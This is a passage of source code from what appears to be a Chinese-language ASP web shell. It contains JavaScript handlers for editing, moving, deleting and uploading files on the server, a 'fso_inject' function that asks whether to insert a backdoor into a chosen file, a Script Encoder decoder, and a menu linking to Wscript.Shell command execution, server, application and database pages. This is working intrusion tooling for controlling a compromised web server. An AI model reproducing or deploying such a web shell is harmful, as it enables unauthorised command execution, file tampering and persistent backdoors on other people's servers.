		if(frm.thePath.value==null||frm.thePath.value==''){
			return false;
		}else{
			frm.submit();
		}
	}
}

function stream_saveAsTwo(thePath){
	var url;
	if(url=prompt('请输入要保存的文件的绝对路径!\n目标文件存在则覆盖.',thePath)){
		if(url==null||url==''){
			return false;
		}else{
			loaded.style.display="none";
			fileEditor.location.href="?pageName=stream&theAct=saveAsTwo&thePath="+thePath+"&toPath="+url;
		}
	}
}

function stream_moveTo(thePath){
	var url;
	if(url=prompt('请输入目标绝对路径!\n目标文件存在则覆盖.',thePath)){
		if(url==null||url==''){
			return false;
		}else{
			loaded.style.display="none";
			fileEditor.location.href="?pageName=stream&theAct=moveTo&thePath="+thePath+"&toPath="+url;
		}
	}
}

function fso_editIt(thePath){
	loaded.style.display="block";
	fileEditor.location.href="?pageName=fso&thePath="+thePath+"&theAct=edit";
}

function fso_saveAs(thePath){
	var url;
	if(url=prompt('请输入要保存的文件的绝对路径!\n目标文件存在则覆盖.',thePath)){
		if(url==null||url==''){
			return false;
		}else{
			loaded.style.display="none";
			fileEditor.location.href="?pageName=fso&theAct=saveAs&thePath="+thePath+"&toPath="+url;
		}
	}
}

function fso_delFile(thePath){
	if(confirm("确认要删除这个文件吗?\n"+thePath)){
		loaded.style.display="none";
		fileEditor.location.href="?pageName=fso&theAct=delFile&thePath="+thePath;
	}
}

function fso_inject(thePath){
	if(confirm("确认要插入后门吗?\n"+thePath)){
		loaded.style.display="none";
		fileEditor.location.href="?pageName=fso&theAct=inject&thePath="+thePath;
	}
}

function fso_delFolder(thePath){
	if(confirm("确认要删除这个目录吗?\n"+thePath)){
		loaded.style.display="none";
		fileEditor.location.href="?pageName=fso&theAct=delFolder&thePath="+thePath;
	}
}

function upload_canSubmit(frm){
	if(frm.fileName.value==''){
		alert('请填写上传后的文件名!');
		return false;
	}else{
		if(frm.file.value==''){
			alert('请选择要上传的文件!');
			return false;
		}else{
			frm.action+='&fileName='+frm.fileName.value;
			frm.Submit.disabled=true;
			return true;
		}
	}
}

function showMenu(){
	if(top.location==location.href){
		menu.style.display="";
	}
}

//以下代码抄袭,不过忘记是从哪里抄的了,做过一点修改

var Words;
function SetWords(word){
	Words=word.value;
}

function SetNewWords(form){
	var NewWords;
	NewWords=unescape(Words);
	form.NewWords.value=NewWords;
}

function SetNewWords1(form){
	var NewWords;
	NewWords=escape(Words);
	form.NewWords.value=NewWords;
}
	function screncode(s,l){
	enc=new ActiveXObject("Scripting.Encoder");
	return enc.EncodeScriptFile("."+l,s,0,l+"cript");
}

var STATE_COPY_INPUT=100
var STATE_READLEN=101
var STATE_DECODE=102
var STATE_UNESCAPE=103

var pick_encoding=new Array(
	1,2,0,1,2,0,2,0,0,2,0,2,1,0,2,0,
	1,0,2,0,1,1,2,0,0,2,1,0,2,0,0,2,
	1,1,0,2,0,2,0,1,0,1,1,2,0,1,0,2,
	1,0,2,0,1,1,2,0,0,1,1,2,0,1,0,2
	)

var rawData=new Array(
	0x64,0x37,0x69,0x50,0x7E,0x2C,0x22,0x5A,0x65,0x4A,0x45,0x72,
	0x61,0x3A,0x5B,0x5E,0x79,0x66,0x5D,0x59,0x75,0x5B,0x27,0x4C,
	0x42,0x76,0x45,0x60,0x63,0x76,0x23,0x62,0x2A,0x65,0x4D,0x43,
	0x5F,0x51,0x33,0x7E,0x53,0x42,0x4F,0x52,0x20,0x52,0x20,0x63,
	0x7A,0x26,0x4A,0x21,0x54,0x5A,0x46,0x71,0x38,0x20,0x2B,0x79,
	0x26,0x66,0x32,0x63,0x2A,0x57,0x2A,0x58,0x6C,0x76,0x7F,0x2B,
	0x47,0x7B,0x46,0x25,0x30,0x52,0x2C,0x31,0x4F,0x29,0x6C,0x3D,
	0x69,0x49,0x70,0x3F,0x3F,0x3F,0x27,0x78,0x7B,0x3F,0x3F,0x3F,
	0x67,0x5F,0x51,0x3F,0x3F,0x3F,0x62,0x29,0x7A,0x41,0x24,0x7E,
	0x5A,0x2F,0x3B,0x66,0x39,0x47,0x32,0x33,0x41,0x73,0x6F,0x77,
	0x4D,0x21,0x56,0x43,0x75,0x5F,0x71,0x28,0x26,0x39,0x42,0x78,
	0x7C,0x46,0x6E,0x53,0x4A,0x64,0x48,0x5C,0x74,0x31,0x48,0x67,
	0x72,0x36,0x7D,0x6E,0x4B,0x68,0x70,0x7D,0x35,0x49,0x5D,0x22,
	0x3F,0x6A,0x55,0x4B,0x50,0x3A,0x6A,0x69,0x60,0x2E,0x23,0x6A,
	0x7F,0x09,0x71,0x28,0x70,0x6F,0x35,0x65,0x49,0x7D,0x74,0x5C,
	0x24,0x2C,0x5D,0x2D,0x77,0x27,0x54,0x44,0x59,0x37,0x3F,0x25,
	0x7B,0x6D,0x7C,0x3D,0x7C,0x23,0x6C,0x43,0x6D,0x34,0x38,0x28,
	0x6D,0x5E,0x31,0x4E,0x5B,0x39,0x2B,0x6E,0x7F,0x30,0x57,0x36,
	0x6F,0x4C,0x54,0x74,0x34,0x34,0x6B,0x72,0x62,0x4C,0x25,0x4E,
	0x33,0x56,0x30,0x56,0x73,0x5E,0x3A,0x68,0x73,0x78,0x55,0x09,
	0x57,0x47,0x4B,0x77,0x32,0x61,0x3B,0x35,0x24,0x44,0x2E,0x4D,
	0x2F,0x64,0x6B,0x59,0x4F,0x44,0x45,0x3B,0x21,0x5C,0x2D,0x37,
	0x68,0x41,0x53,0x36,0x61,0x58,0x58,0x7A,0x48,0x79,0x22,0x2E,
	0x09,0x60,0x50,0x75,0x6B,0x2D,0x38,0x4E,0x29,0x55,0x3D,0x3F
)

var transformed=new Array()
for (var i=0; i<3; i++) transformed[i]=new Array()
for (var i=31; i<=126; i++) for (var j=0; j<3; j++) transformed[j][rawData[(i-31) * 3+j]]=(i==31)?9:i
	var digits=new Array()
for (var i=0; i<26; i++){
	digits["A".charCodeAt(0)+i]=i
	digits["a".charCodeAt(0)+i]=i+26
}
for (var i=0; i<10; i++) digits["0".charCodeAt(0)+i]=i+52
digits[0x2b]=62
digits[0x2f]=63

function unescape2(char){
	var escapes="#&!*$"
	var escaped="\r\n<>@"
		if (char.charCodeAt(0) > 126) return char
	if (escapes.indexOf(char)!=-1) return escaped.substr(escapes.indexOf(char),1)
	return "?"
}

function decodeBase64(string){
	var val=0
	val+=(digits[string.substr(0,1).charCodeAt(0)]<<2)
	val+=(digits[string.substr(1,1).charCodeAt(0)]>>4)
	val+=(digits[string.substr(1,1).charCodeAt(0)]&0xf)<<12
	val+=((digits[string.substr(2,1).charCodeAt(0)]>>2)<<8)
	val+=((digits[string.substr(2,1).charCodeAt(0)]&0x3)<<22)
	val+=(digits[string.substr(3,1).charCodeAt(0)]<<16)
	return val
}

function strdec(encodingString){
	var marker="#@~^"
	var stringIndex=0
	var scriptIndex=-1
	var unEncodingIndex=0
	var char=null
	var encodingLength=unEncodinglength=0
	var state=STATE_COPY_INPUT
	var unEncodingString=""
	var re,arr
		while(state){
		switch (state){
			case (STATE_COPY_INPUT):
				scriptIndex=encodingString.indexOf(marker,stringIndex)
				if (scriptIndex!=-1){
					unEncodingString+=encodingString.substring(stringIndex,scriptIndex)
					scriptIndex+=marker.length
					state=STATE_READLEN
				}else{
					stringIndex=stringIndex==0?0:stringIndex
					unEncodingString+=encodingString.substr(stringIndex,encodingString.length)
					state=0
				}
			break
		case (STATE_READLEN):
			encodingLength=encodingString.substr(scriptIndex,6)
			unEncodinglength=decodeBase64(encodingLength)
			scriptIndex+=(6+"==".length)
			state=STATE_DECODE
			break
		case (STATE_DECODE):
			if (!unEncodinglength){
				stringIndex=scriptIndex+"DQgAAA==^#~@".length
				unEncodingIndex=0
				state=STATE_COPY_INPUT
				break
			}
			char=encodingString.substr(scriptIndex,1)
			if (char=="@") state=STATE_UNESCAPE
			else{
				if (char.charCodeAt(0)<0xFF){
					unEncodingString+=String.fromCharCode(transformed[pick_encoding[unEncodingIndex%64]][char.charCodeAt(0)])
					unEncodingIndex++
				}else{
					unEncodingString+=char
				} 
				scriptIndex++
				unEncodinglength--
				break
			}
		case STATE_UNESCAPE:
			unEncodingString+=unescape2(encodingString.substr(++scriptIndex,1))
			scriptIndex++; unEncodinglength -=2
			unEncodingIndex++
			state=STATE_DECODE
			break
		}
	}
		re=new RegExp("(JScript|VBscript).encode","gmi")
	while(arr=re.exec(unEncodingString)) unEncodingString=RegExp.leftContext+RegExp.$1+RegExp.rightContext
	return unEncodingString
}
</script>
<%
	end sub
	
	sub showMenu()
		if pageName="" or pageName="default" or pageName="login" then
			exit sub
		end if
		echo "<div style=""display:none;"" id=""menu"" align=""center"">"
		echo "<a href=""?pageName=server"">〖Server〗</a><a href=""?pageName=stream"">〖Stream〗</a>"
		echo "<a href=""?pageName=fso"">〖FSO〗</a><a href=""?pageName=cmdShell"">〖Wscript.Shell〗</a>"
		echo "<a href=""?pageName=app"">〖Application〗</a>"
		echo "<a href=""?pageName=sql"">〖MS DataBase〗</a><a href=""?pageName=upload"">〖Other〗</a>"
		echo "<br><br></div>"
		echo "<script language=""JavaScript"">showMenu();</script>"
	end sub
%>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312">